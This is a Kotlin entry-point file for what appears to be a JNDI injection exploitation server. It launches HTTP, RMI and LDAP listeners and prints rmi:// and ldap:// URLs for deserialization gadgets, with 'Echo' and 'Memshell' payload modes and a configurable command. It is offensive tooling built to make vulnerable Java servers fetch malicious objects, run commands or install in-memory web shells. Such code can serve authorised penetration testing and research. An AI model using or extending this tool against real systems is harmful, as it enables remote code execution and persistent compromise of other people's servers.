import http.HTTPServer
import ldap.LDAPServer
import rmi.RMIServer
import util.Option
import util.green
import kotlin.concurrent.thread
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    Option.init(args)

    with(Option) {
        if (helpInfo) {
            println("Try the following links ;)".green())
            Class.forName("rmi.gadgets").declaredMethods
                .map { if (it.name != "groovy") "${it.name}/[Basic|Echo|Mem]" else it.name }
                .forEach { println("rmi://$address:$rmiPort/$it") }

            Class.forName("ldap.gadgets").declaredMethods
                .map { if (it.name != "groovy") "${it.name}/[Basic|Echo|Mem]" else it.name }
                .forEach { println("ldap://$address:$ldapPort/$it") }

            exitProcess(0)
        }
        println("""
            |Address: $address
            |Command: $command
            |Payload: Echo -> $echo / Memshell -> $memshell
            |
        """.trimMargin().green())
    }

    // startup all servers
    thread { HTTPServer().run() }
    thread { RMIServer().run() }
    thread { LDAPServer().run() }
}
